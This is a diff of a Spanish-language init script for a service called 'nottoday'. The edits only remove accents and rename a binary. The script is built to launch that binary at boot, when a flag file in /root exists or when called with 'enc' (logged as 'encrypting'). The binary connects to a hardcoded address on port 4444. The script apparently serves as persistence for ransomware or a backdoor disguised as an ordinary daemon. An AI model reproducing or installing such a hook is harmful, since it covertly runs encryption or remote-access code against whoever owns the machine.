@@ -12,14 +12,14 @@
 
 LOG_FILE="/var/log/nottoday.log"
 
-echo "$(date): corrió nuestro daemon" >> $LOG_FILE
+echo "$(date): corrio nuestro daemon" >> $LOG_FILE
 
 case $1 in
     start|restart|force-reload)
-        echo "$(date): corrió $1" >> $LOG_FILE
+        echo "$(date): corrio $1" >> $LOG_FILE
 
 	if [ -f /root/flag.ntd ];then
-		/usr/sbin/tumama 192.168.0.24 4444
+		/usr/sbin/principal 192.168.0.24 4444
 	fi
 	;;
     stop)
@@ -27,10 +27,10 @@ case $1 in
         ;;
     enc)
 	echo "$(date): cifrando uwu" >> $LOG_FILE
-        /usr/sbin/tumama 192.168.0.24 4444
+        /usr/sbin/principal 192.168.0.24 4444
 	;;
     status)
-	echo "$(date): se analizó el estado" >> $LOG_FILE
+	echo "$(date): se analizo el estado" >> $LOG_FILE
         exit 0
         ;;
     *)
